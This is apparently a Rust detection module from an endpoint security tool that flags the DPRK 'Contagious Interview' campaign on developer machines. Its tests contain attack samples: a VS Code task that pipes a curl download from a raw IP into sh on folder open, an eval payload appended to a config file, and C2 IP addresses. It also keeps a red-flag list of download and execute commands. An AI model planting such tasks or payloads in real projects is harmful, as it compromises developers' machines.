//! DPRK developer-workstation detections (MITRE **G1052**, "Contagious
//! Interview" / DeceptiveDevelopment / Famous Chollima).
//!
//! One cluster, many vendor names: Contagious Interview = DeceptiveDevelopment =
//! Famous Chollima = Wagemole/UNC5342 = Tenacious Pungsan = DEV#POPPER. Three
//! delivery generations matter here:
//!
//! 1. Fake recruiter sends a "coding test" repo or a trojanized meeting app.
//! 2. Mass npm typosquat flooding, `postinstall` → loader → BeaverTail.
//! 3. **PolinRider / TasksJacker (2026)**: account takeover with payloads injected
//!    into *existing, legitimate* repos, `.vscode/tasks.json` abuse, and stage-2
//!    fetched from blockchain RPC dead-drops instead of a takedownable C2.
//!
//! Generation 3 is why this module exists: it removes the "the developer was
//! socially engineered" precondition. The victim is compromised by opening a
//! repository they already trusted.
//!
//! # What is deliberately NOT detected here
//!
//! Every rule below is chosen to be near-zero false positive, because a false
//! positive on a developer's own machine is worse than useless — it trains the
//! operator to ignore the tool. Specifically rejected:
//!
//! * **`postinstall` spawning `curl`/`wget`.** The obvious rule, and a trap:
//!   `sharp`, `puppeteer`, `playwright`, `node-gyp`, `canvas`, `better-sqlite3`,
//!   `electron` and `node-sass` all download binaries at install time by design.
//!   That rule fires on a clean `npm ci` in most repos. The signal is the
//!   *destination* (raw IP literal, odd port, shortener), never the behaviour.
//! * **"Obfuscated JavaScript" / long base64 / `eval` presence.** Every minified
//!   bundle in `node_modules` looks exactly like this.
//! * **Telegram or AnyDesk presence.** Both are legitimate; useful only as
//!   corroboration *after* a Tier-1 hit.
//! * **Blockchain RPC egress.** Excellent signal on a workstation that does no
//!   web3 work and worthless in a crypto shop, so it belongs behind an operator
//!   toggle rather than in a default-on detector.
//! * **Bare zero-width joiners.** Legitimate emoji in strings and comments
//!   contain ZWJ and U+FE0F; only Private Use Area codepoints are flagged.
//!
//! Sources: Socket (PolinRider, 2026-07-01; 338 npm packages, 2025-10-10),
//! MITRE ATT&CK G1052, Microsoft (2026-03-11), Unit 42, Cisco Talos
//! (2025-10-16), eSentire DEV#POPPER (2026-03-05).

use std::path::{Path, PathBuf};

use crate::alerts::{Alert, AlertKind, Severity};

/// A single high-confidence indicator.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct DprkFinding {
    /// Stable rule id (`DPRK-1` …), so an operator can map an alert to a rule.
    pub rule: &'static str,
    pub title: String,
    pub detail: String,
    /// The artifact. Every finding names a concrete path or endpoint: an alert
    /// with nothing to act on is noise.
    pub artifact: String,
    pub severity: Severity,
    /// MITRE ATT&CK technique.
    pub attack_id: &'static str,
}

impl DprkFinding {
    /// Render as a SIEM alert.
    pub fn to_alert(&self) -> Alert {
        Alert {
            id: 0,
            kind: AlertKind::DprkIndicator,
            severity: self.severity.clone(),
            title: self.title.clone(),
            detail: format!("{} [{} · {}]", self.detail, self.rule, self.attack_id),
            package_name: None,
            package_ecosystem: None,
            ip_address: None,
            cve_ids: vec![],
            event_title: None,
            created_at: chrono::Utc::now().to_rfc3339(),
            acked: false,
            file_path: Some(self.artifact.clone()),
            source: DPRK_SOURCE.to_string(),
        }
    }
}

/// Alert `source` for this detector, and the reconcile scope's match target.
pub const DPRK_SOURCE: &str = "DPRK (Contagious Interview)";

// ─────────────────────────── DPRK-1: staging paths ───────────────────────────

/// Exact on-disk staging paths used by BeaverTail / InvisibleFerret /
/// OtterCookie. No legitimate software uses these, so a hit is effectively
/// conclusive.
///
/// Brittle by nature — one actor commit away from useless — but the check costs
/// a handful of `stat` calls, so it stays worth having.
const MALWARE_PATHS: &[(&str, &str)] = &[
    (".n2/pay", "BeaverTail/InvisibleFerret stage-2 payload"),
    (".n2/bow", "InvisibleFerret browser-stealer module"),
    (".n2/mlip", "InvisibleFerret keylogger module"),
    (".n2", "InvisibleFerret staging directory"),
    (".npl", "InvisibleFerret payload staging file"),
];

/// Scan a home directory for known malware staging artifacts (DPRK-1).
pub fn scan_malware_paths(home: &Path) -> Vec<DprkFinding> {
    let mut out = Vec::new();
    for (rel, what) in MALWARE_PATHS {
        let p = home.join(rel);
        if !p.exists() {
            continue;
        }
        // `.n2` is only reported when its children are absent, so a hit on
        // `.n2/pay` does not also raise a vaguer duplicate for the directory.
        if *rel == ".n2"
            && MALWARE_PATHS
                .iter()
                .any(|(r, _)| *r != ".n2" && home.join(r).exists())
        {
            continue;
        }
        out.push(DprkFinding {
            rule: "DPRK-1",
            title: format!("DPRK malware artifact on disk: {rel}"),
            detail: format!(
                "{what}. This exact path is used by the Contagious Interview \
                 toolchain (BeaverTail / InvisibleFerret) and is not created by \
                 legitimate software. Treat this host as compromised: rotate \
                 credentials, SSH keys, and any wallet seeds reachable from it."
            ),
            artifact: p.display().to_string(),
            severity: Severity::Critical,
            attack_id: "T1059.007",
        });
    }
    out
}

/// An interpreter executing out of a known staging directory (DPRK-1).
///
/// The highest-value process signal available: `python`/`node` whose command
/// line references `.n2/` or `.npl`.
pub fn scan_process_cmdlines(procs: &[(String, String)]) -> Vec<DprkFinding> {
    let mut out = Vec::new();
    for (name, cmdline) in procs {
        let n = name.to_ascii_lowercase();
        // deno is a first-class interpreter in the Contagious Interview / BeaverTail
        // tooling (see the agent-process table in ai_detector), so a deno process
        // executing from .n2/ or .npl must not slip past this gate.
        if !(n.contains("python")
            || n.contains("node")
            || n.contains("pythonw")
            || n.contains("deno"))
        {
            continue;
        }
        let c = cmdline.replace('\\', "/");
        let Some(hit) = ["/.n2/", "/.npl", " .n2/", " .npl"]
            .iter()
            .find(|m| c.contains(**m))
        else {
            continue;
        };
        out.push(DprkFinding {
            rule: "DPRK-1",
            title: format!("Interpreter running from a DPRK staging path: {name}"),
            detail: format!(
                "Process '{name}' is executing code from '{}', a staging path \
                 used by InvisibleFerret. Legitimate tooling does not run out of \
                 these directories. Kill the process and treat the host as \
                 compromised.\nCommand line: {cmdline}",
                hit.trim()
            ),
            artifact: cmdline.clone(),
            severity: Severity::Critical,
            attack_id: "T1059.006",
        });
    }
    out
}

// ───────────────────── DPRK-2: BeaverTail C2 URI grammar ─────────────────────

/// Ports BeaverTail / OtterCookie C2s have been observed on.
const C2_PORTS: &[u16] = &[1224, 1418, 1476, 1478];

/// Path components unique to the BeaverTail C2 protocol.
const C2_PATHS: &[&str] = &["/pdown", "/client/", "/uploads", "/keys"];

/// Active connection to a BeaverTail C2 (DPRK-2).
///
/// The port-plus-raw-IP combination is the discriminator. `1224` on a loopback
/// or private dev service is not interesting; a *raw IPv4 literal* peer on that
/// port is.
pub fn check_connections(peers: &[String]) -> Vec<DprkFinding> {
    let mut out = Vec::new();
    for peer in peers {
        let Some((host, port)) = split_host_port(peer) else {
            continue;
        };
        if !C2_PORTS.contains(&port) {
            continue;
        }
        // Only a bare IPv4 literal counts: a hostname on these ports is far more
        // likely to be someone's own service.
        if !is_ipv4_literal(host) || is_private_or_loopback(host) {
            continue;
        }
        out.push(DprkFinding {
            rule: "DPRK-2",
            title: format!("Connection to a BeaverTail C2 port: {peer}"),
            detail: format!(
                "Active connection to {host} on port {port}, a port used by the \
                 BeaverTail / OtterCookie C2 protocol, with a raw IP literal and \
                 no hostname. Capture the process owning this socket before \
                 killing it."
            ),
            artifact: peer.clone(),
            severity: Severity::Critical,
            attack_id: "T1571",
        });
    }
    out
}

/// Whether a URL matches the BeaverTail C2 request grammar (`:1224/pdown` …).
/// Exposed for scanning captured strings; the port and path together are unique.
pub fn is_c2_uri(url: &str) -> bool {
    let lower = url.to_ascii_lowercase();
    C2_PORTS.iter().any(|p| lower.contains(&format!(":{p}/")))
        && C2_PATHS.iter().any(|path| lower.contains(path))
}

fn split_host_port(s: &str) -> Option<(&str, u16)> {
    let (host, port) = s.rsplit_once(':')?;
    Some((host, port.parse().ok()?))
}

fn is_ipv4_literal(host: &str) -> bool {
    let octets: Vec<&str> = host.split('.').collect();
    octets.len() == 4
        && octets.iter().all(|o| {
            !o.is_empty()
                && o.bytes().all(|b| b.is_ascii_digit())
                && o.parse::<u16>().is_ok_and(|v| v <= 255)
        })
}

fn is_private_or_loopback(host: &str) -> bool {
    host.starts_with("127.")
        || host.starts_with("10.")
        || host.starts_with("192.168.")
        || host.starts_with("169.254.")
        || host == "0.0.0.0"
        || (host.starts_with("172.")
            && host
                .split('.')
                .nth(1)
                .and_then(|o| o.parse::<u8>().ok())
                .is_some_and(|o| (16..=31).contains(&o)))
}

// ─────────────────── DPRK-3: invisible Unicode in source ────────────────────

/// Private Use Area codepoints hidden in source (DPRK-3).
///
/// PolinRider hides payload data in codepoints that render as nothing. Scoped to
/// **Private Use Area** only: legitimate emoji in string literals and comments
/// routinely contain zero-width joiners and U+FE0F, so flagging those would fire
/// on ordinary code. No legitimate JavaScript source carries PUA codepoints.
pub fn scan_invisible_unicode(path: &Path, content: &str) -> Option<DprkFinding> {
    let mut count = 0usize;
    let mut first_line = 0usize;
    for (i, line) in content.lines().enumerate() {
        for ch in line.chars() {
            if is_private_use_area(ch) {
                count += 1;
                if first_line == 0 {
                    first_line = i + 1;
                }
            }
        }
    }
    if count == 0 {
        return None;
    }
    Some(DprkFinding {
        rule: "DPRK-3",
        title: format!(
            "Invisible Unicode in source: {}",
            path.file_name().unwrap_or_default().to_string_lossy()
        ),
        detail: format!(
            "{count} Private Use Area codepoint(s) starting at line {first_line}. \
             These render as nothing and are used by the PolinRider campaign to \
             hide payload data in otherwise ordinary-looking source. No \
             legitimate source needs them. Inspect the raw bytes, not the \
             rendered file."
        ),
        artifact: path.display().to_string(),
        severity: Severity::High,
        attack_id: "T1027",
    })
}

fn is_private_use_area(ch: char) -> bool {
    let c = ch as u32;
    // BMP PUA plus the two supplementary planes.
    (0xE000..=0xF8FF).contains(&c)
        || (0xF0000..=0xFFFFD).contains(&c)
        || (0x100000..=0x10FFFD).contains(&c)
}

// ───────────── DPRK-4: payload appended to a JS config file ─────────────────

/// Config filenames PolinRider appends payloads to.
const JS_CONFIG_NAMES: &[&str] = &[
    "postcss.config.mjs",
    "postcss.config.js",
    "tailwind.config.js",
    "tailwind.config.ts",
    "eslint.config.mjs",
    "eslint.config.js",
    "next.config.mjs",
    "next.config.js",
    "babel.config.js",
    "vite.config.js",
    "vite.config.ts",
];

/// A line this long in a hand-written config is not hand-written. PolinRider
/// pads the payload with whitespace to push it off the right edge of the editor.
const LONG_LINE_COLS: usize = 1_000;

/// Obfuscated JS appended *after* the default export of a config file (DPRK-4).
///
/// Both conditions are required: content after the export **and** an absurdly
/// long line. Either alone has legitimate explanations (trailing helpers; a
/// generated or inlined asset).
pub fn scan_js_config(path: &Path, content: &str) -> Option<DprkFinding> {
    let name = path.file_name()?.to_string_lossy().to_ascii_lowercase();
    if !JS_CONFIG_NAMES.contains(&name.as_str()) {
        return None;
    }

    let export_line = content.lines().position(|l| {
        let t = l.trim_start();
        t.starts_with("export default") || t.starts_with("module.exports")
    })?;

    let (long_idx, long_len) = content
        .lines()
        .enumerate()
        .skip(export_line + 1)
        .map(|(i, l)| (i, l.chars().count()))
        .max_by_key(|(_, len)| *len)?;
    if long_len < LONG_LINE_COLS {
        return None;
    }

    Some(DprkFinding {
        rule: "DPRK-4",
        title: format!("Payload appended to config: {name}"),
        detail: format!(
            "Line {} is {long_len} columns wide and sits after the default export \
             on line {}. The PolinRider campaign appends obfuscated JavaScript \
             below a config file's export and pads it with whitespace so it \
             scrolls off-screen in an editor. Nobody writes a {long_len}-column \
             config line by hand.",
            long_idx + 1,
            export_line + 1
        ),
        artifact: path.display().to_string(),
        severity: Severity::Critical,
        attack_id: "T1027",
    })
}

// ──────────────── DPRK-5: .vscode/tasks.json auto-run on open ───────────────

/// Commands that make an auto-running task hostile rather than merely unusual.
// Matched as substrings against the lowercased command+args, so these must be
// specific enough not to collide with ordinary task text. "base64" and "eval"
// were removed: they matched benign tasks like
// `node scripts/gen-base64-assets.js` (contains "base64") and paths/flags
// containing "eval" ("--eval-cache", "medieval"), firing a Critical false
// positive. The fetch/exec verbs below are the real TasksJacker signature.
const TASK_RED_FLAGS: &[&str] = &[
    "curl",
    "wget",
    "invoke-expression",
    "iex",
    "powershell -e",
    "bitsadmin",
];

/// A VS Code task set to run on folder open **and** carrying a fetch/eval
/// command (DPRK-5).
///
/// `runOn: folderOpen` is legitimate but rare; the command is the discriminator.
/// This is the TasksJacker technique: opening a trusted repo executes the task.
pub fn scan_vscode_tasks(path: &Path, content: &str) -> Option<DprkFinding> {
    let json: serde_json::Value = serde_json::from_str(content).ok()?;
    let tasks = json.get("tasks")?.as_array()?;

    for task in tasks {
        let runs_on_open = task
            .get("runOptions")
            .and_then(|r| r.get("runOn"))
            .and_then(|v| v.as_str())
            .is_some_and(|s| s.eq_ignore_ascii_case("folderOpen"));
        if !runs_on_open {
            continue;
        }
        // Consider the command and its args together.
        let mut text = task
            .get("command")
            .and_then(|v| v.as_str())
            .unwrap_or_default()
            .to_ascii_lowercase();
        if let Some(args) = task.get("args").and_then(|v| v.as_array()) {
            for a in args {
                if let Some(s) = a.as_str() {
                    text.push(' ');
                    text.push_str(&s.to_ascii_lowercase());
                }
            }
        }
        let Some(flag) = TASK_RED_FLAGS.iter().find(|f| text.contains(**f)) else {
            continue;
        };
        return Some(DprkFinding {
            rule: "DPRK-5",
            title: "VS Code task auto-runs a fetch/eval command on folder open".to_string(),
            detail: format!(
                "A task in this workspace is configured with \
                 runOptions.runOn = folderOpen and invokes '{flag}'. Opening the \
                 folder in VS Code executes it — no build, no prompt. This is the \
                 TasksJacker technique: the payload rides in an existing, trusted \
                 repository. Do not open this workspace again until the task is \
                 removed.\nCommand: {text}"
            ),
            artifact: path.display().to_string(),
            severity: Severity::Critical,
            attack_id: "T1059",
        });
    }
    None
}

// ────────────────────────────── Filesystem sweep ─────────────────────────────

/// Source extensions worth checking for hidden codepoints.
const SOURCE_EXTS: &[&str] = &["js", "ts", "jsx", "tsx", "mjs", "cjs"];

/// Cap the sweep so a huge tree cannot wedge a scan.
const MAX_FILES: usize = 20_000;
/// Files above this size are bundles, not hand-written source.
const MAX_FILE_BYTES: u64 = 2 * 1024 * 1024;

/// Walk `root` and run the file-based rules (DPRK-3, DPRK-4, DPRK-5).
///
/// `node_modules` and the other excluded dirs are skipped: they are full of
/// minified bundles that would drown the Unicode rule, and the campaign's
/// injection target is the developer's own tracked source.
pub fn scan_tree(root: &Path) -> Vec<DprkFinding> {
    let mut out = Vec::new();
    let mut stack = vec![root.to_path_buf()];
    let mut budget = MAX_FILES;

    while let Some(dir) = stack.pop() {
        if budget == 0 {
            break;
        }
        let Ok(rd) = std::fs::read_dir(&dir) else {
            continue;
        };
        for entry in rd.flatten() {
            if budget == 0 {
                break;
            }
            let path = entry.path();
            let Ok(ft) = entry.file_type() else { continue };
            if ft.is_symlink() {
                continue; // never follow links out of the tree
            }
            if ft.is_dir() {
                if !crate::fsroots::is_excluded_scan_dir(&path) {
                    stack.push(path);
                }
                continue;
            }
            budget -= 1;
            if entry.metadata().map(|m| m.len()).unwrap_or(u64::MAX) > MAX_FILE_BYTES {
                continue;
            }

            let name = entry.file_name().to_string_lossy().to_ascii_lowercase();
            let ext = path
                .extension()
                .map(|e| e.to_string_lossy().to_ascii_lowercase())
                .unwrap_or_default();

            let is_task = name == "tasks.json"
                && path
                    .parent()
                    .and_then(|p| p.file_name())
                    .is_some_and(|d| d == ".vscode");
            let is_config = JS_CONFIG_NAMES.contains(&name.as_str());
            let is_source = SOURCE_EXTS.contains(&ext.as_str());
            if !(is_task || is_config || is_source) {
                continue;
            }
            let Ok(content) = std::fs::read_to_string(&path) else {
                continue;
            };

            if is_task {
                out.extend(scan_vscode_tasks(&path, &content));
            }
            if is_config {
                out.extend(scan_js_config(&path, &content));
            }
            if is_source {
                out.extend(scan_invisible_unicode(&path, &content));
            }
        }
    }
    out
}

/// Every host-level check: staging paths, processes, and connections.
pub fn scan_host(home: &Path, procs: &[(String, String)], peers: &[String]) -> Vec<DprkFinding> {
    let mut out = scan_malware_paths(home);
    out.extend(scan_process_cmdlines(procs));
    out.extend(check_connections(peers));
    out
}

/// Home directory to sweep for staging artifacts.
///
/// This matters more than it looks. Legion self-elevates, which makes `HOME`
/// root's — but the malware lands in the *developer's* home, so scanning `$HOME`
/// after elevation would look in the one place it never is. Prefer the invoking
/// human's home, recovered from the elevation environment.
pub fn user_home() -> Option<PathBuf> {
    #[cfg(unix)]
    {
        // pkexec/sudo record who invoked us. Trust the name only as a directory
        // lookup, never as a shell argument.
        if let Some(user) =
            std::env::var_os("SUDO_USER").or_else(|| std::env::var_os("PKEXEC_USER"))
        {
            let user = user.to_string_lossy().to_string();
            if !user.is_empty() && user != "root" {
                let candidate = PathBuf::from("/home").join(&user);
                if candidate.is_dir() {
                    return Some(candidate);
                }
            }
        }
    }
    std::env::var_os("HOME")
        .or_else(|| std::env::var_os("USERPROFILE"))
        .map(PathBuf::from)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn staging_paths_are_flagged_and_not_double_reported() {
        let dir = tempfile::tempdir().unwrap();
        let home = dir.path();
        std::fs::create_dir_all(home.join(".n2")).unwrap();
        std::fs::write(home.join(".n2/pay"), b"x").unwrap();

        let hits = scan_malware_paths(home);
        assert!(hits.iter().any(|h| h.artifact.ends_with(".n2/pay")));
        // The bare `.n2` directory must not also raise a vaguer duplicate.
        assert!(
            !hits.iter().any(|h| h.artifact.ends_with(".n2")),
            "the parent dir must not duplicate a child hit"
        );
        assert!(hits.iter().all(|h| h.severity == Severity::Critical));
    }

    #[test]
    fn a_clean_home_is_silent() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::create_dir_all(dir.path().join("Documents")).unwrap();
        std::fs::write(dir.path().join(".bashrc"), b"export PATH=$PATH").unwrap();
        assert!(scan_malware_paths(dir.path()).is_empty());
    }

    #[test]
    fn only_interpreters_running_from_staging_paths_are_flagged() {
        let procs = vec![
            // The real signal.
            (
                "python3".to_string(),
                "python3 /home/dev/.n2/pay".to_string(),
            ),
            // Ordinary dev work must stay silent.
            (
                "node".to_string(),
                "node /home/dev/app/server.js".to_string(),
            ),
            ("python3".to_string(), "python3 -m http.server".to_string()),
            // A non-interpreter mentioning the path (e.g. a grep) is not it.
            ("grep".to_string(), "grep -r .n2/ /home/dev".to_string()),
        ];
        let hits = scan_process_cmdlines(&procs);
        assert_eq!(hits.len(), 1, "got {:?}", hits);
        assert!(hits[0].artifact.contains(".n2/pay"));
    }

    #[test]
    fn c2_ports_only_fire_on_public_raw_ip_literals() {
        let hits = check_connections(&[
            "23.27.20.143:1224".to_string(),  // real signal
            "172.86.88.188:1478".to_string(), // real signal (OtterCookie port)
            "127.0.0.1:1224".to_string(),     // own dev service
            "192.168.1.10:1224".to_string(),  // LAN
            "10.0.0.5:1418".to_string(),      // LAN
            "example.com:1224".to_string(),   // hostname, not a raw literal
            "23.27.20.143:443".to_string(),   // ordinary port
        ]);
        let arts: Vec<&str> = hits.iter().map(|h| h.artifact.as_str()).collect();
        assert_eq!(
            arts,
            vec!["23.27.20.143:1224", "172.86.88.188:1478"],
            "got {arts:?}"
        );
    }

    #[test]
    fn private_ranges_are_excluded() {
        assert!(is_private_or_loopback("127.0.0.1"));
        assert!(is_private_or_loopback("10.1.2.3"));
        assert!(is_private_or_loopback("192.168.0.1"));
        assert!(is_private_or_loopback("172.16.0.1"));
        assert!(is_private_or_loopback("172.31.255.255"));
        // 172.32 is public — the /12 ends at 172.31.
        assert!(!is_private_or_loopback("172.32.0.1"));
        assert!(!is_private_or_loopback("23.27.20.143"));
    }

    #[test]
    fn c2_uri_grammar_needs_both_port_and_path() {
        assert!(is_c2_uri("http://23.27.20.143:1224/pdown"));
        assert!(is_c2_uri("http://1.2.3.4:1224/client/9"));
        // Port alone or path alone is not enough.
        assert!(!is_c2_uri("http://localhost:1224/health"));
        assert!(!is_c2_uri("http://example.com/uploads"));
    }

    #[test]
    fn emoji_do_not_trip_the_invisible_unicode_rule() {
        // The FP that would sink this rule: legitimate emoji contain zero-width
        // joiners and variation selectors. Only Private Use Area is flagged.
        let src = "// 👍 ship it 👨‍👩‍👧‍👦\nconst flag = '🇺🇸';\nconst ok = '✔️';\n";
        assert!(scan_invisible_unicode(Path::new("a.js"), src).is_none());
    }

    #[test]
    fn private_use_area_codepoints_are_flagged() {
        let src = "const a = 1;\nconst b = '\u{e000}\u{e001}hidden';\n";
        let hit = scan_invisible_unicode(Path::new("evil.js"), src).expect("PUA must be flagged");
        assert_eq!(hit.rule, "DPRK-3");
        assert!(hit.detail.contains("line 2"), "{}", hit.detail);
    }

    #[test]
    fn dependency_caches_are_not_swept() {
        // Both real false positives from the first production run lived in a
        // package-manager cache:
        //
        //   ~/.bun/install/cache/iconv-lite@0.7.2/encodings/sbcs-data-generated.js
        //   ~/.bun/install/cache/qs@6.15.3/test/stringify.js
        //
        // The first is a generated CHARSET TABLE, which contains Private Use
        // Area codepoints because mapping them is its entire job; the second is
        // a test fixture full of deliberate encoding oddities. The claim that
        // "no legitimate JavaScript carries PUA codepoints" was simply wrong —
        // encoding libraries do. Neither is the developer's own source, which
        // is what these campaigns inject into.
        let dir = tempfile::tempdir().unwrap();
        let cached = dir
            .path()
            .join(".bun/install/cache/iconv-lite@0.7.2/encodings");
        std::fs::create_dir_all(&cached).unwrap();
        std::fs::write(
            cached.join("sbcs-data-generated.js"),
            "const t = \"\u{e000}\u{e001}\u{e002}\";\n",
        )
        .unwrap();

        let hits = scan_tree(dir.path());
        assert!(
            hits.is_empty(),
            "dependency caches must not be swept: {:?}",
            hits.iter().map(|h| &h.artifact).collect::<Vec<_>>()
        );
    }

    #[test]
    fn the_developers_own_source_is_still_swept() {
        // The exclusion above must not become a blanket amnesty: the same file
        // inside the project itself is exactly what DPRK-3 exists to catch.
        let dir = tempfile::tempdir().unwrap();
        let src = dir.path().join("src");
        std::fs::create_dir_all(&src).unwrap();
        std::fs::write(src.join("index.js"), "const s = \"\u{e000}payload\";\n").unwrap();

        let hits = scan_tree(dir.path());
        assert_eq!(hits.len(), 1, "own source must still be scanned: {hits:?}");
        assert_eq!(hits[0].rule, "DPRK-3");
    }

    #[test]
    fn ordinary_source_is_silent() {
        let src = "export function add(a, b) {\n  return a + b; // simple\n}\n";
        assert!(scan_invisible_unicode(Path::new("math.ts"), src).is_none());
    }

    #[test]
    fn config_payload_needs_both_position_and_length() {
        let long = "a".repeat(5000);
        // Real case: obfuscated blob appended after the export, padded wide.
        let evil = format!("export default {{}};\nconst _0x=\"{long}\";eval(_0x);\n");
        let hit = scan_js_config(Path::new("postcss.config.mjs"), &evil).expect("must flag");
        assert_eq!(hit.rule, "DPRK-4");
        assert_eq!(hit.severity, Severity::Critical);

        // A normal config with helpers after the export is fine.
        let normal = "const cfg = {};\nexport default cfg;\nfunction helper() { return 1; }\n";
        assert!(scan_js_config(Path::new("postcss.config.mjs"), normal).is_none());

        // A long line BEFORE the export (an inlined asset) is not this campaign.
        let inlined = format!("const data = \"{long}\";\nexport default {{ data }};\n");
        assert!(scan_js_config(Path::new("next.config.mjs"), &inlined).is_none());

        // Not a config file at all.
        assert!(scan_js_config(Path::new("index.js"), &evil).is_none());
    }

    #[test]
    fn vscode_task_needs_folder_open_and_a_red_flag() {
        // TasksJacker: auto-runs on open and fetches remote code.
        let evil = r#"{"version":"2.0.0","tasks":[
            {"label":"init","type":"shell","command":"curl","args":["http://1.2.3.4/a.sh","|","sh"],
             "runOptions":{"runOn":"folderOpen"}}]}"#;
        let hit = scan_vscode_tasks(Path::new(".vscode/tasks.json"), evil).expect("must flag");
        assert_eq!(hit.rule, "DPRK-5");

        // Auto-run alone is legitimate (a watcher) and must not fire.
        let benign = r#"{"version":"2.0.0","tasks":[
            {"label":"watch","type":"shell","command":"npm","args":["run","watch"],
             "runOptions":{"runOn":"folderOpen"}}]}"#;
        assert!(scan_vscode_tasks(Path::new(".vscode/tasks.json"), benign).is_none());

        // A fetch command that does NOT auto-run is just a build task.
        let manual = r#"{"version":"2.0.0","tasks":[
            {"label":"fetch","type":"shell","command":"curl","args":["https://x/y"]}]}"#;
        assert!(scan_vscode_tasks(Path::new(".vscode/tasks.json"), manual).is_none());

        assert!(scan_vscode_tasks(Path::new(".vscode/tasks.json"), "not json").is_none());
    }

    #[test]
    fn tree_sweep_finds_planted_artifacts_and_ignores_clean_ones() {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path();
        std::fs::create_dir_all(root.join(".vscode")).unwrap();
        std::fs::write(
            root.join(".vscode/tasks.json"),
            r#"{"tasks":[{"label":"x","command":"curl http://1.2.3.4/a","runOptions":{"runOn":"folderOpen"}}]}"#,
        )
        .unwrap();
        std::fs::write(root.join("index.js"), "export const ok = 1;\n").unwrap();
        std::fs::write(
            root.join("tailwind.config.js"),
            format!(
                "module.exports = {{}};\nconst x=\"{}\";\n",
                "b".repeat(4000)
            ),
        )
        .unwrap();

        let hits = scan_tree(root);
        let rules: Vec<&str> = hits.iter().map(|h| h.rule).collect();
        assert!(rules.contains(&"DPRK-5"), "got {rules:?}");
        assert!(rules.contains(&"DPRK-4"), "got {rules:?}");
        // The clean source file must not be flagged.
        assert!(!hits.iter().any(|h| h.artifact.ends_with("index.js")));
    }

    #[test]
    fn every_finding_names_an_artifact() {
        // An alert with nothing to act on is noise — the exact failure the
        // framework rollups had.
        let dir = tempfile::tempdir().unwrap();
        std::fs::create_dir_all(dir.path().join(".n2")).unwrap();
        std::fs::write(dir.path().join(".n2/pay"), b"x").unwrap();
        let hits = scan_host(
            dir.path(),
            &[("python3".into(), "python3 /h/.n2/pay".into())],
            &["23.27.20.143:1224".into()],
        );
        assert_eq!(hits.len(), 3);
        for h in &hits {
            assert!(!h.artifact.is_empty(), "{} has no artifact", h.rule);
            let alert = h.to_alert();
            assert!(alert.file_path.is_some());
            assert_eq!(alert.source, DPRK_SOURCE);
            assert!(alert.detail.contains(h.rule));
        }
    }
}
